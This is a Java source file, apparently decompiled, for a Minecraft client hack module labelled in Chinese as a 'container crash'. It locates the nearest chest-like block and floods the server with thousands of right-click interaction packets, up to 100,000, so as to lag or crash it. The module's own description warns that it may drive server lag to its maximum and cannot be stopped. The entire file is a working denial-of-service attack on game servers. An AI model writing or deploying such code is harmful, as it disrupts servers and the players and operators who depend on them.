package lexis.Hack.Hacks.Misc;

import java.util.HashSet;
import java.util.Iterator;
import java.util.Set;
import lexis.Hack.Hack;
import lexis.Hack.Hackutil.NotificationManager;
import lexis.Hack.Hackutil.config.HackConfig;
import lexis.Hack.Utils.HeadOnlyLookUtils.HeadOnlyLook;
import lexis.Hack.gui.screens.ContainerSelectScreen;
import net.minecraft.client.Minecraft;
import net.minecraft.core.BlockPos;
import net.minecraft.core.Direction;
import net.minecraft.world.InteractionHand;
import net.minecraft.world.level.block.Block;
import net.minecraft.world.level.block.Blocks;
import net.minecraft.world.phys.BlockHitResult;
import net.minecraft.world.phys.Vec3;
import org.lwjgl.glfw.GLFW;

public class ContainerCrashHack extends Hack {
   private HackConfig config;
   private static final String CONFIG_KEY = "容器崩房";
   private int packetAmount = 10000;
   private Set targetContainers = new HashSet();
   private boolean isCrashing = false;
   private long crashStartTime = 0L;
   private static final int CRASH_DELAY = 3000;
   private BlockPos targetPos = null;
   private boolean wasLeftClicked = false;
   private boolean crashCompleted = false;
   private boolean enabledFlag = false;

   public ContainerCrashHack() {
      super("容器崩房", new String[]{"对最近的容器方块快速发送大量右键包导致服务器延迟最高", "§c§l警告：可能导致服务器延迟最高！无法停下！"}, Hack.Category.MISC, true);
      this.addSetting(new Hack.Setting("数据包数量", "每次右键发送的数据包数量 (3000-100000)", 10000, 3000, 100000, Hack.ValueDisplay.INTEGER));
      this.addSetting(new Hack.Setting("选择容器", "选择要攻击的容器类型", "选择方块", () -> {
         if (mc != null) {
            mc.m_91152_(new ContainerSelectScreen(this, mc.f_91080_));
         }

      }));
      this.targetContainers.add(Blocks.f_50087_);
      this.targetContainers.add(Blocks.f_50325_);
      this.targetContainers.add(Blocks.f_50265_);
      this.targetContainers.add(Blocks.f_50618_);
      this.targetContainers.add(Blocks.f_50456_);
      this.targetContainers.add(Blocks.f_50457_);
      this.targetContainers.add(Blocks.f_50458_);
      this.targetContainers.add(Blocks.f_50459_);
      this.targetContainers.add(Blocks.f_50460_);
      this.targetContainers.add(Blocks.f_50461_);
      this.targetContainers.add(Blocks.f_50462_);
      this.targetContainers.add(Blocks.f_50463_);
      this.targetContainers.add(Blocks.f_50464_);
      this.targetContainers.add(Blocks.f_50465_);
      this.targetContainers.add(Blocks.f_50466_);
      this.targetContainers.add(Blocks.f_50520_);
      this.targetContainers.add(Blocks.f_50521_);
      this.targetContainers.add(Blocks.f_50522_);
      this.targetContainers.add(Blocks.f_50523_);
      this.targetContainers.add(Blocks.f_50524_);
      this.targetContainers.add(Blocks.f_50525_);
      this.targetContainers.add(Blocks.f_50094_);
      this.targetContainers.add(Blocks.f_50620_);
      this.targetContainers.add(Blocks.f_50619_);
      this.targetContainers.add(Blocks.f_50332_);
      this.targetContainers.add(Blocks.f_50061_);
      this.targetContainers.add(Blocks.f_50286_);
      this.targetContainers.add(Blocks.f_50255_);
      this.targetContainers.add(Blocks.f_50091_);
      this.targetContainers.add(Blocks.f_50201_);
      this.targetContainers.add(Blocks.f_50322_);
      this.targetContainers.add(Blocks.f_50323_);
      this.targetContainers.add(Blocks.f_50324_);
      this.targetContainers.add(Blocks.f_50273_);
      this.targetContainers.add(Blocks.f_50624_);
      this.config = HackConfig.getInstance();
      this.loadConfig();
   }

   private void loadConfig() {
      this.packetAmount = (int)this.config.getDoubleSetting("容器崩房", "数据包数量", 10000.0);
      Iterator var1 = this.getSettings().iterator();

      while(var1.hasNext()) {
         Hack.Setting setting = (Hack.Setting)var1.next();
         if (setting.getName().equals("数据包数量")) {
            setting.setValue((double)this.packetAmount);
            break;
         }
      }

   }

   public boolean isEnabled() {
      return this.enabledFlag;
   }

   public void setEnabled(boolean enabled) {
      if (this.isToggleable()) {
         if (this.enabledFlag != enabled) {
            this.enabledFlag = enabled;
            if (enabled) {
               this.onEnable();
            } else {
               this.onDisable();
            }

         }
      }
   }

   public void toggle() {
      this.setEnabled(!this.enabledFlag);
   }

   public void onEnable() {
      this.loadConfig();
      this.isCrashing = false;
      this.targetPos = null;
      this.crashCompleted = false;
   }

   public void onDisable() {
      this.isCrashing = false;
      this.targetPos = null;
      this.crashCompleted = false;
      HeadOnlyLook.stopLooking();
   }

   public void onUpdate() {
      boolean needSave = false;
      Iterator var2 = this.getSettings().iterator();

      while(var2.hasNext()) {
         Hack.Setting setting = (Hack.Setting)var2.next();
         if (setting.getName().equals("数据包数量")) {
            int newAmount = (int)setting.getDouble();
            if (newAmount != this.packetAmount) {
               this.packetAmount = newAmount;
               needSave = true;
            }
            break;
         }
      }

      if (needSave) {
         this.config.saveHackSettings("容器崩房", this.getSettings());
      }

      Minecraft mc = Minecraft.m_91087_();
      if (mc.f_91074_ != null && mc.f_91072_ != null) {
         if (this.crashCompleted) {
            this.setEnabled(false);
         } else {
            long currentTime;
            if (!this.isCrashing) {
               currentTime = mc.m_91268_().m_85439_();
               boolean leftPressed = GLFW.glfwGetMouseButton(currentTime, 0) == 1;
               if (leftPressed && !this.wasLeftClicked) {
                  BlockPos nearestContainer = this.findNearestContainer(6.0);
                  if (nearestContainer == null) {
                     NotificationManager.error("容器崩房", "找不到最近的容器方块！");
                     this.setEnabled(false);
                     return;
                  }

                  this.targetPos = nearestContainer;
                  this.isCrashing = true;
                  this.crashStartTime = System.currentTimeMillis();
                  NotificationManager.info("容器崩房", "找到容器，3秒后开始崩房...", 3);
               }

               this.wasLeftClicked = leftPressed;
            } else {
               currentTime = System.currentTimeMillis();
               long elapsed = currentTime - this.crashStartTime;
               int finalAmount;
               if (elapsed < 3000L) {
                  finalAmount = (int)((3000L - elapsed) / 1000L) + 1;
                  NotificationManager.info("容器崩房", "开始崩房 -> " + finalAmount + "秒后", 1);
                  if (this.targetPos != null) {
                     HeadOnlyLook.startLookingAt(this.targetPos);
                  }
               } else {
                  finalAmount = this.packetAmount;
                  Iterator var8 = this.getSettings().iterator();

                  while(var8.hasNext()) {
                     Hack.Setting setting = (Hack.Setting)var8.next();
                     if (setting.getName().equals("数据包数量")) {
                        finalAmount = (int)setting.getDouble();
                        this.packetAmount = finalAmount;
                        break;
                     }
                  }

                  if (this.targetPos != null) {
                     HeadOnlyLook.startLookingAt(this.targetPos);
                     BlockHitResult blockHit = new BlockHitResult(Vec3.m_82512_(this.targetPos), Direction.UP, this.targetPos, false);

                     for(int i = 0; i < finalAmount; ++i) {
                        mc.f_91072_.m_233732_(mc.f_91074_, InteractionHand.MAIN_HAND, blockHit);
                        if (i % 1000 == 0 && i > 0) {
                           try {
                              Thread.sleep(1L);
                           } catch (InterruptedException var11) {
                              var11.printStackTrace();
                           }
                        }
                     }

                     NotificationManager.info("容器崩房", "崩房完成！发送了 " + finalAmount + " 个数据包", 3);
                     this.crashCompleted = true;
                     this.isCrashing = false;
                     this.targetPos = null;
                     HeadOnlyLook.stopLooking();
                     this.setEnabled(false);
                  }
               }

            }
         }
      }
   }

   private BlockPos findNearestContainer(double range) {
      Minecraft mc = Minecraft.m_91087_();
      if (mc.f_91074_ != null && mc.f_91073_ != null) {
         BlockPos playerPos = mc.f_91074_.m_20183_();
         BlockPos nearest = null;
         double nearestDist = range * range;
         int rangeInt = (int)Math.ceil(range);

         for(int x = -rangeInt; x <= rangeInt; ++x) {
            for(int y = -rangeInt; y <= rangeInt; ++y) {
               for(int z = -rangeInt; z <= rangeInt; ++z) {
                  BlockPos pos = playerPos.m_7918_(x, y, z);
                  double dist = playerPos.m_123331_(pos);
                  if (!(dist > range * range)) {
                     Block block = mc.f_91073_.m_8055_(pos).m_60734_();
                     if (this.targetContainers.contains(block) && (nearest == null || dist < nearestDist)) {
                        nearest = pos;
                        nearestDist = dist;
                     }
                  }
               }
            }
         }

         return nearest;
      } else {
         return null;
      }
   }

   public void onClick() {
      if (this.isEnabled()) {
         this.setEnabled(false);
         this.isCrashing = false;
         this.targetPos = null;
         this.crashCompleted = false;
         HeadOnlyLook.stopLooking();
         NotificationManager.info("容器崩房", "已取消崩房", 2);
      } else {
         this.setEnabled(true);
      }

   }

   public Set getTargetContainers() {
      return this.targetContainers;
   }

   public void setTargetContainers(Set containers) {
      this.targetContainers.clear();
      this.targetContainers.addAll(containers);
      this.config.saveHackSettings("容器崩房", this.getSettings());
   }
}
